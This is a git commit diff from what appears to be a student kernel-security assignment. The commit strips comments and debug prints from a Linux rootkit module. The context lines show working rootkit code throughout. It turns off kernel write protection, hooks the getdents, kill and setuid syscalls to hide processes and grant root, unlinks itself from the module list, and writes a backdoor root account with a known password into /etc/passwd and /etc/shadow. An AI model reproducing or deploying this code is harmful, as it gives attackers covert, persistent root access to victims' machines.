9b1255c3d7664f57a2100be492641215943b022e
Yunjing Liu <yl483@duke.edu>
2019-04-23 20:10:23 -0400

    delete comment

--- secure_mod.c
+++ secure_mod.c
@@ -13,17 +13,12 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-//Macros for kernel functions to alter Control Register 0 (CR0)
-//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
-//Bit 0 is the WP-bit (write protection). We want to flip this to 0
-//so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
 
 #define BUFFLEN 32
 #define PF_INVISIBLE 0x10000000
 #define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"
-
 #define BACKDOOR_SHADOW "user1:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:16888:0:99999:7:::\n" // password is password
 
 #define PASSWD "/etc/passwd"
@@ -55,37 +50,7 @@ unsigned long* GetSysTable(void){
 	return (unsigned long*)NULL;
 }
 
-//These are function pointers to the system calls that change page
-//permissions for the given address (page) to read-only or read-write.
-//Grep for "set_pages_ro" and "set_pages_rw" in:
-//      /boot/System.map-`$(uname -r)`
-//      e.g. /boot/System.map-4.4.0-116-generic
-//void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
-//void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
-//This is a pointer to the system call table in memory
-//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
-//We're getting its adddress from the System.map file (see above).
-//static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
-
-//Function pointer will be used to save address of original 'open' syscall.
-//The asmlinkage keyword is a GCC #define that indicates this function
-//should expect ti find its arguments on the stack (not in registers).
-//This is used for all system calls.
-//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
-/* Setuid syscall hook */
-//asmlinkage int (*origin_setuid) (uid_t uid);
-
-
-/*
-struct task_struct* FindTask(pid_t pid){
-	struct task_struct* curp = current;
-	for_each_process(curp){
-		if(curp->pid == pid) return curp;
-	}
-	return NULL;
-}
-*/
 int isInvisible(pid_t pid){
 	struct task_struct* task;
 	if(!pid) return 0;
@@ -101,7 +66,6 @@ int isInvisible(pid_t pid){
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-  /* //hide the sneaky process */
   	struct linux_dirent* d;
 	char* name;
 	char d_type;
@@ -135,28 +99,6 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   	return read;
   	return original_getdents(fd, dirp, count);
 }
-/*
-asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
-  
-  char* get_fp = (char*)__get_free_page(GFP_TEMPORARY);
-  struct file* file_get = fget(fd);
-  char* cur_path = d_path(&file_get->f_path, get_fp, PAGE_SIZE);
-  
-  ssize_t read = original_read(fd,buf,count);
-  char* temp = strstr((char*)buf,"sneaky_mod");
-  if(temp != NULL){
-    char* newlineptr = strchr(temp,'\n');
-    if(newlineptr != NULL){
-      if(strstr(cur_path,"/proc")!=NULL){
-        read = read - (newlineptr - temp + 1);
-        memmove(temp,newlineptr+1,strlen(newlineptr+1)+1);
-        return read;
-      }
-    }
-  }
-  return read;
-}
-*/
 
 static struct list_head* module_head;
 static short mhide = 0;
@@ -202,9 +144,6 @@ asmlinkage int secure_setuid(uid_t uid)
     {
       /* Create new cred struct */
       struct cred *new_cred;
-      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
-      printk(KERN_WARNING "[!] Attempting UID change!");
-      /* Prepares new set of credentials for task_struct of current process */
       new_cred = prepare_creds();
       /* Set uid of new cred struct to 0 */
       new_cred->uid = GLOBAL_ROOT_UID;
@@ -255,8 +194,6 @@ int cp_passwd(char* path, char* copypath){
   filesize = stat.size;
   printk("filesize = %d\n", filesize);
   char buf[filesize];
-  //ret = vfs_llseek(fin, begin, SEEK_SET);
-  //ret = vfs_llseek(fin, end, SEEK_END);
   set_fs(old_fs);
   if(ret < 0){
 	  printk("wrong end offset\n");
@@ -291,8 +228,6 @@ void add_backdoor(char * pathname)
   int ret = 0;
   mm_segment_t old_fs;
   struct file *file;
-
-  printk(KERN_ALERT "hello add backdoor\n");
   if(strcmp(pathname, PASSWD)==0){
     BACKDOOR = BACKDOOR_PASSWD;
     cp_passwd(pathname, PASSWD_COPY);
@@ -366,7 +301,6 @@ int restore_passwd(char* copypath, char* path){
   ret = vfs_stat(copypath, &copystat);
   filesize = stat.size;
   copyfilesize = copystat.size;
-  //printk("filesize = %d\n", filesize);
   char buf[filesize]; 
   char copybuf[copyfilesize];
   old_fs = get_fs();
@@ -385,11 +319,8 @@ int restore_passwd(char* copypath, char* path){
     i++;
   }
   buf[filesize-1] = '\n';
-  printk("filesize:%d, filecopysize:%d\n", filesize, copyfilesize);
-  printk("buf is %s\n", buf);
   old_fs = get_fs();
   set_fs(get_ds());
-  //begin = vfs_llseek(fout, begin, SEEK_SET);
   begin = 0;
   ret = vfs_write(fout, buf, filesize, &begin);
   set_fs(old_fs);
@@ -403,35 +334,15 @@ int restore_passwd(char* copypath, char* path){
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
-  //struct page *page_ptr;
-
-  //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-
   unsigned long cr0 = read_cr0();
   clear_bit(16, &cr0);
   write_cr0(cr0);
-  /*
-  //Turn off write protection mode
-  write_cr0(read_cr0() & (~0x10000));
-  //Get a pointer to the virtual page containing the address
-  //of the system call table in the kernel.
-  page_ptr = virt_to_page(&sys_call_table);
-  //Make this page read-write accessible
-  pages_rw(page_ptr, 1);
-  */
   add_backdoor(PASSWD);
   add_backdoor(SHADOW);
-  //This is the magic! Save away the original 'open' system call
-  //function address. Then overwrite its address in the system call
-  //table with the function address of our new code.
-  //origin_setuid = (void*)*(sys_call_table + __NR_setuid);
-  //*(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid;
   module_head = THIS_MODULE->list.prev;
   list_del(&THIS_MODULE->list);
   mhide = 1;
- 
-  
   unsigned long *sys_call_table = GetSysTable();
   //getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);  
@@ -442,12 +353,6 @@ static int initialize_sneaky_module(void)
   //setuid
   origin_setuid = (void*)*(sys_call_table + __NR_setuid);
   *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
-  /*
-  //Revert page to read-only
-  pages_ro(page_ptr, 1);
-  //Turn write protection mode back on
-  write_cr0(read_cr0() | 0x10000);
-  */
   cr0 = read_cr0();
   set_bit(16, &cr0);
   write_cr0(cr0);
@@ -457,37 +362,19 @@ static int initialize_sneaky_module(void)
 
 static void exit_sneaky_module(void) 
 {
-  //struct page *page_ptr;
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
   unsigned long cr0 = read_cr0();
   clear_bit(16, &cr0);
   write_cr0(cr0);
-  /*
-  //Turn off write protection mode
-  write_cr0(read_cr0() & (~0x10000));
-  //Get a pointer to the virtual page containing the address
-  //of the system call table in the kernel.
-  page_ptr = virt_to_page(&sys_call_table);
-  //Make this page read-write accessible
-  pages_rw(page_ptr, 1);
-  */
   //restore passwd and shadow file
   restore_passwd(PASSWD_COPY, PASSWD);
   restore_passwd(SHADOW_COPY, SHADOW);
 
   unsigned long *sys_call_table = GetSysTable();
-  //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
   *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
-  //*(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
-  /*
-  //Revert page to read-only
-  pages_ro(page_ptr, 1);
-  //Turn write protection mode back on
-  write_cr0(read_cr0() | 0x10000);
-  */
   cr0 = read_cr0();
   set_bit(16, &cr0);
   write_cr0(cr0);
